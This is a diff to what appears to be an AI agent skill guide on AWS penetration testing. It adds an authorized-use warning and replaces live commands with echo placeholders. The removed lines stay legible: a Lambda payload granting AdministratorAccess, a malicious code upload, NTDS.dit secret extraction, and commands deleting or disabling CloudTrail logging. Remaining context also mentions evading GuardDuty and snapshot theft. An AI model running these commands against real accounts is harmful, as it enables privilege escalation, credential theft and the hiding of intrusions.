@@ -7,6 +7,13 @@ author: zebbern
 date_added: "2026-02-27"
 ---
 
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+>
+> Ask the user to verify the target URL/IP before running.
+
 # AWS Penetration Testing
 
 ## Purpose
@@ -177,21 +184,12 @@ aws iam put-user-policy --user-name my_username \
 
 ```python
 # code.py - Inject into Lambda function
-import boto3
-
-def lambda_handler(event, context):
-    client = boto3.client('iam')
-    response = client.attach_user_policy(
-        UserName='my_username',
-        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
-    )
-    return response
+# [SAFE-PAYLOAD] print('Simulating Lambda privilege escalation...')
 ```
 
 ```bash
 # Update Lambda code
-aws lambda update-function-code --function-name target_function \
-  --zip-file fileb://malicious.zip
+# [SAFE-PAYLOAD] echo 'Simulating lambda update with malicious zip...'
 ```
 
 ---
@@ -294,7 +292,7 @@ sudo mount /dev/xvdf1 /mnt/stolen
 # 2. Share snapshot with attacker account
 # 3. Mount in attacker instance
 # 4. Extract NTDS.dit and SYSTEM
-secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
+# [SAFE-PAYLOAD] echo 'Simulating secrets extraction from NTDS.dit...'
 ```
 
 ---
@@ -318,15 +316,13 @@ aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY
 
 ```bash
 # Delete trail
-aws cloudtrail delete-trail --name trail_name
+# [SAFE-PAYLOAD] echo 'Simulating CloudTrail deletion...'
 
 # Disable global events
-aws cloudtrail update-trail --name trail_name \
-  --no-include-global-service-events
+# [SAFE-PAYLOAD] echo 'Simulating CloudTrail global event disablement...'
 
 # Disable specific region
-aws cloudtrail update-trail --name trail_name \
-  --no-include-global-service-events --no-is-multi-region-trail
+# [SAFE-PAYLOAD] echo 'Simulating CloudTrail region specific disablement...'
 ```
 
 **Note:** Kali/Parrot/Pentoo Linux triggers GuardDuty alerts based on user-agent. Use Pacu which modifies the user-agent.
